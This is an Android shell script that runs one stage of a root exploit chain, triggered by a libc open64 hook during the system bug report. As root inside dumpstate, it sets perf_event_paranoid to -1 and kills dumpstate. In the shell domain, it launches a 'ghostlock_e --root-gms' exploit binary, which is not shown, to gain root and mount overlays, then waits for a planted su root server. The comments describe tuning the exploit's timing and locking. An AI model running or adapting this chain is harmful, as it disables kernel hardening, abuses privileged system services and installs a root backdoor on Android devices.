#!/system/bin/sh
# gms_restore.sh - restore ROOT + native GMS from the libc open64 hook payload.
# (v6, 2026-09-26) Fixes found from a failed app-triggered run:
#   * the ONE-RESTORE-PER-BOOT lock is now taken ONLY AFTER perf==-1, i.e. only when we
#     WILL run the exploit.  The old order took the lock before the perf gate, so a single
#     premature stage-2 firing (ANY uid-2000 shell open64 after arming - e.g. an adb shell,
#     or the app's own helper) consumed the lock and the real trigger then read
#     "already handled" -> the boot could not restore.  (Observed in glroot.log.)
#   * the boot key is /proc/stat btime (stable across processes) instead of boot_id.
#   * the overlay idempotency check / count is base-agnostic (the root-phase tmpfs base is
#     not deterministic: /data/local/tmp/glrt, /mnt, ...).
#
# Two stages, one trigger (the system's bug report):
#   uid 0    -> dumpstate: write perf_event_paranoid=-1 (stage 1).
#   uid 2000 -> u:r:shell:s0 (bugreportz): the only domain allowed to exec shell_data_file,
#               so stage 2 runs `ghostlock_e --root-gms` (shield-free complete root + GMS).

PATH=/system/bin:/vendor/bin:/system/xbin
export PATH
D=/data/local/tmp
exec >> $D/glroot.log 2>&1
chmod 644 $D/glroot.log 2>/dev/null
echo "=== gms_restore $(date) uid=$(id -u) ==="
echo "ts_stage2_enter=$(date +%s)"
echo "uid=$(id)"
echo "ctx=$(cat /proc/self/attr/current 2>/dev/null)"
echo "cap=$(grep CapEff /proc/self/status 2>/dev/null)"

# =============================================================== stage 1: uid 0 (perf)
if [ "$(id -u)" = "0" ]; then
    echo -1 > /proc/sys/kernel/perf_event_paranoid
    echo "ts_perf_set=$(date +%s) perf_after_write=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)"
    # Free a stale shell-stage marker if this domain has CAP_DAC_OVERRIDE (dumpstate does).
    rm -f $D/.glp2 2>/dev/null
    # STOP THE HEAVY REPORT NOW.  We are uid 0 in dumpstate's own domain, so we may signal it;
    # the shell-domain kill from stage 2 is DENIED before the permissive patch is applied.
    # The report's collection (dumpsys of every service + logs) was measured to drive loadavg
    # to ~449 and starve the exploit's timing-sensitive arms -> watchdog resets.
    pkill -9 dumpstate 2>/dev/null
    echo "ts_dumpstate_killed=$(date +%s)"
    exit 0
fi

# ============================================= stage 2: uid 2000 (the shell domain)
CTX=$(cat /proc/self/attr/current 2>/dev/null)
case "$CTX" in
    *shell*) : ;;
    *) echo "stage2: domain '$CTX' is not shell -> releasing the marker and exiting"
       rm -f $D/.glp2 2>/dev/null
       exit 0 ;;
esac

# Idempotency (BASE-AGNOSTIC): if our GMS overlay is already mounted this boot, stop.
if toybox grep -qE "upperdir=[^ ]*/gms/upper-priv" /proc/mounts 2>/dev/null; then
    echo "already restored this boot (overlay present) -> exiting"
    rm -f $D/.glp0 2>/dev/null
    exit 0
fi

# Wait for stage 1 (perf==-1).  NOTHING is locked or consumed before this point, so a
# premature stage-2 firing can abort cleanly and a LATER firing can retry.
i=0
while [ $i -lt 60 ]; do
    [ "$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)" = "-1" ] && break
    sleep 2
    i=$((i+1))
done
perf=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)
echo "perf=$perf (waited $((i*2))s)"
if [ "$perf" != "-1" ]; then
    echo "ABORT: perf is not -1 -> stage 1 has not run; releasing the marker (retry later)"
    rm -f $D/.glp2 2>/dev/null
    exit 0
fi

# ONE exploit run per boot, ATOMICALLY, and only NOW (perf is ready so we will run it).
# Key = the boot's btime (epoch seconds), which is stable across processes within a boot.
BID=$(awk '/^btime/{print $2}' /proc/stat 2>/dev/null)
[ -z "$BID" ] && BID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
if [ -n "$BID" ]; then
    if ! mkdir "$D/.glboot.$BID" 2>/dev/null; then
        echo "stage2: boot $BID already handled -> exiting (no second exploit run)"
        exit 0
    fi
fi
echo "stage2: boot $BID -> starting the restore"

# Reduce GMS/Play crash-loop churn around the restore.  NOTE: the memory-pressure theory
# of FACTS 9an(169) was retracted by 9an(170); this is kept only as harmless churn control.
for p in com.google.android.gms com.android.vending com.google.android.youtube; do
    am force-stop "$p" 2>/dev/null
done
echo "stage2: force-stopped the google packages"

# ---- run the exploit: --root-gms (now shield-free) does the overlays + framework restart
nohup $D/ghostlock_e --root-gms > $D/gl.root.out 2>&1 &
chmod 644 $D/gl.root.out 2>/dev/null
echo "ts_exploit_launched=$(date +%s)"
# FAST-ABORT the bug report: dumpstate was only needed for stage 1 (perf).  Kill it now so
# the (slow) report collection stops while the exploit runs; do NOT kill bugreportz shell.
pkill -9 dumpstate 2>/dev/null
echo "stage2: aborted the dumpstate report collection"
i=0
while [ $i -lt 120 ]; do
    $D/su -c true >/dev/null 2>&1 && break
    sleep 2
    i=$((i+1))
done
if ! $D/su -c true >/dev/null 2>&1; then
    echo "ABORT: the gl_su root command server never came up"
    exit 1
fi
echo "root server ready (after $((i*2)) s)"
echo "overlays mounted: $(toybox grep -cE "upperdir=[^ ]*/gms/upper-priv" /proc/mounts 2>/dev/null)/3"
echo "(the framework restart is issued by --root-gms itself)"

# ---- re-arm for the next boot ---------------------------------------------------
rm -f $D/.glp0 $D/.glp2 2>/dev/null
echo "=== markers cleared (re-armed; the hook itself dies with the next reboot) ==="
